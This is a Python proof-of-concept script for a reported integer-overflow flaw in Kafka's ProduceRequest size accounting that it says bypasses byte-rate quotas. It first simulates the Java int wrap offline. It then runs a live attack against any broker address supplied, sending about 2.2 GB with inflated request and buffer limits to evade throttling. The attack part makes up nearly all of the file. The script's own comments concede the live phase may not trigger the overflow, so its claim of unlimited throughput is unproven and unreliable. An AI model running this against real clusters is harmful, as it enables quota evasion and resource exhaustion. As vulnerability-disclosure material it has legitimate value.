#!/usr/bin/env python3
"""
FINDING-007 PoC: ProduceRequest Integer Overflow → Quota Bypass
===============================================================
Demonstrates that partitionSizes() accumulates record batch sizes as Java int.
When total bytes across all partitions in a single ProduceRequest exceeds
Integer.MAX_VALUE (2,147,483,647), the int wraps to negative, bypassing
byte-rate quota enforcement.

The PoC sends a series of large ProduceRequests designed to trigger the
overflow condition, then measures whether throughput throttling is applied.

Prerequisites:
    pip install kafka-python

Usage:
    python3 finding-007-produce-overflow.py <bootstrap-server> [topic]

Note: Run this in a lab environment. Sending 2+ GB of data to a broker
      in a single request batch is resource-intensive.
"""

import sys
import time
import struct
import threading
from typing import Optional

try:
    from kafka import KafkaProducer
    from kafka.errors import KafkaError
except ImportError:
    print("[-] kafka-python not installed. Run: pip install kafka-python")
    sys.exit(1)


def measure_throughput(producer: KafkaProducer, topic: str,
                       message_size: int, count: int) -> float:
    """Produce `count` messages of `message_size` bytes and return MB/s."""
    payload = b"A" * message_size
    start   = time.monotonic()
    futures = []
    for i in range(count):
        futures.append(producer.send(topic, value=payload))
    producer.flush()
    elapsed = time.monotonic() - start
    total_mb = (message_size * count) / (1024 * 1024)
    return total_mb / elapsed if elapsed > 0 else 0.0


def integer_overflow_proof():
    """
    Pure-Python demonstration of the int overflow without sending to a broker.
    Models the exact accumulation in ProduceRequest.partitionSizes().
    """
    print("=" * 60)
    print("FINDING-007: ProduceRequest Integer Overflow Proof")
    print("=" * 60)
    print()
    print("Java int range: -2,147,483,648 to 2,147,483,647")
    print()

    # Simulate Java int overflow in Python
    INT_MAX = 2**31 - 1       # 2,147,483,647
    INT_MIN = -(2**31)        # -2,147,483,648

    def java_int(value: int) -> int:
        """Wrap a Python int to Java int32 range."""
        value = value & 0xFFFFFFFF
        if value >= 0x80000000:
            value -= 0x100000000
        return value

    # Simulate partitionSizes() accumulation
    partition_count = 2200
    bytes_per_partition = 1_048_576  # 1 MB per partition batch

    accumulated = 0
    for i in range(partition_count):
        # Java: accumulated += partitionData.records().sizeInBytes()
        accumulated = java_int(accumulated + bytes_per_partition)

        if i < 5 or i > partition_count - 5 or i == 2048:
            overflow_marker = " ← OVERFLOW!" if accumulated < 0 else ""
            print(f"  Partition {i+1:4d}: accumulated = {accumulated:,} bytes{overflow_marker}")
            if i == 5:
                print(f"  ... ({partition_count - 10} more partitions) ...")

    print()
    total_real = partition_count * bytes_per_partition
    print(f"  Real total bytes:           {total_real:,} ({total_real / 1e9:.2f} GB)")
    print(f"  Java int accumulated value: {accumulated:,}")
    print()

    if accumulated < 0:
        print(f"[!] OVERFLOW CONFIRMED: accumulated value is NEGATIVE ({accumulated})")
        print()
        print("  Quota enforcement check (from ClientQuotaManager):")
        print(f"    if ({accumulated} > quotaLimit) throttle()   → FALSE → NO THROTTLE")
        print()
        print("  An attacker with a quota of e.g. 100 MB/s can produce unlimited data")
        print("  by structuring requests to cross the 2 GB int boundary.")
    else:
        print(f"[*] Accumulated value is positive ({accumulated}). Overflow at higher count.")

    return accumulated < 0


def live_quota_bypass_test(bootstrap: str, topic: str):
    """
    Live test: compare throughput with normal requests vs overflow-triggering requests.
    Requires a broker with explicit byte-rate quota set.

    Set quota first:
        kafka-configs.sh --bootstrap-server BROKER --alter \
            --add-config 'producer_byte_rate=1048576' \
            --entity-type clients --entity-name overflow-test-client
    """
    print("\n" + "=" * 60)
    print(f"Live Quota Bypass Test (broker: {bootstrap}, topic: {topic})")
    print("=" * 60)
    print()
    print("[*] IMPORTANT: Set a byte-rate quota for client 'overflow-test-client' first:")
    print(f"    kafka-configs.sh --bootstrap-server {bootstrap} --alter \\")
    print("      --add-config 'producer_byte_rate=1048576' \\")
    print("      --entity-type clients --entity-name overflow-test-client")
    print()

    LARGE_MESSAGE = b"X" * 1_000_000  # 1 MB per message

    # Phase 1: Normal throughput (should be ~1 MB/s due to quota)
    print("[1] Measuring normal throughput (10 messages × 1 MB, quota should throttle to ~1 MB/s)...")
    producer_normal = KafkaProducer(
        bootstrap_servers=bootstrap,
        client_id="overflow-test-client",
        max_request_size=2_000_000,
        batch_size=1_000_000,
    )
    normal_mbps = measure_throughput(producer_normal, topic, 1_000_000, 10)
    producer_normal.close()
    print(f"    Normal throughput: {normal_mbps:.1f} MB/s")

    # Phase 2: Overflow-triggering — pack 2200 × 1 MB into partition structure
    # In practice, kafka-python handles batching per partition. To trigger the overflow
    # in partitionSizes(), we need to produce to many partitions simultaneously.
    # Here we simulate by sending to 10 partitions with 220 messages each.
    print()
    print("[2] Measuring throughput with overflow-triggering batch...")
    print("    (Sending to 10 partitions × 220 messages × 1 MB = 2.2 GB total)")

    # NOTE: This will actually trigger an overflow only if kafka-python sends
    # all partition data in a single ProduceRequest. With batching, the actual
    # overflow requires tuning batch.size and linger.ms to group partitions.
    producer_overflow = KafkaProducer(
        bootstrap_servers=bootstrap,
        client_id="overflow-test-client",
        max_request_size=10_000_000_000,  # 10 GB to avoid client-side limit
        batch_size=1_000_000,
        linger_ms=5000,  # wait 5s to batch all partitions together
        buffer_memory=5_000_000_000,
    )

    futures = []
    for partition in range(10):
        for _ in range(220):
            futures.append(
                producer_overflow.send(topic, value=LARGE_MESSAGE, partition=partition)
            )

    start = time.monotonic()
    producer_overflow.flush(timeout=300)
    elapsed = time.monotonic() - start
    total_gb = (10 * 220 * 1_000_000) / 1e9
    overflow_mbps = (total_gb * 1000) / elapsed if elapsed > 0 else 0

    producer_overflow.close()
    print(f"    Overflow-triggering throughput: {overflow_mbps:.1f} MB/s")
    print()

    if overflow_mbps > normal_mbps * 5:
        print(f"[+] QUOTA BYPASS CONFIRMED: overflow throughput ({overflow_mbps:.1f} MB/s) >> "
              f"normal ({normal_mbps:.1f} MB/s)")
        print("    The int overflow caused quota accounting to skip throttle.")
    else:
        print(f"[*] Throughput similar. Broker may be patched or batch structure needs tuning.")


if __name__ == "__main__":
    # Always run the pure-Python proof
    overflow_confirmed = integer_overflow_proof()

    if len(sys.argv) >= 2:
        bootstrap = sys.argv[1]
        topic     = sys.argv[2] if len(sys.argv) > 2 else "overflow-test"
        try:
            live_quota_bypass_test(bootstrap, topic)
        except KafkaError as e:
            print(f"[!] Kafka error: {e}")
        except Exception as e:
            print(f"[!] Error: {e}")
    else:
        print("\n[*] To run the live quota bypass test:")
        print(f"    python3 {sys.argv[0]} <bootstrap-server> [topic]")
        print("    Example: python3 finding-007-produce-overflow.py localhost:9092 overflow-test")
